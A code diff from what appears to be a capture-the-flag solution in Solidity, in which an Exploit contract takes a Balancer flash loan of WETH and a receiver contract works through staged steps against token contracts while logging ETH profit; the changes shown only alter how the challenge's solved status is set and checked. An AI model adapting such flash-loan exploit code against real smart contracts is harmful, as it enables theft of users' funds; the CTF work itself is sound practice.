@@ -61,7 +61,10 @@ contract Exploit{
        _tokens[0]=IERC20(address(wETH9));
        _amounts[0]=wETH9.balanceOf(address(balancer));
        balancer.flashloan(flashLoanReceiver, _tokens, _amounts, _data);
-        
+       if(flashLoanReceiver.state()==3){
+          setup.setPlayer(address(flashLoanReceiver));
+          console.log("CHALL STATUS:",setup.isSolved());
+       }
     }
 }
 
@@ -80,7 +83,7 @@ contract FlashLoanReceiver is IFlashLoanRecipient {
     LamboToken public lamboToken1;
     LamboToken public lamboToken2;
     LamboToken public lamboToken3;
-    uint8 state;
+    uint8 public state;
     uint256 this_balance=0;
     constructor(Setup _setup){
         setup=_setup;
@@ -167,8 +170,6 @@ contract FlashLoanReceiver is IFlashLoanRecipient {
             console.log("ETH PROFIT AFTER STEP2 :",address(this).balance - this_balance);
         }else{
             console.log("ETH PROFIT AFTER STEP3 :",address(this).balance - this_balance);
-            setup.solve();
-            console.log(setup.isSolved());
         }
         this_balance=address(this).balance;
         }
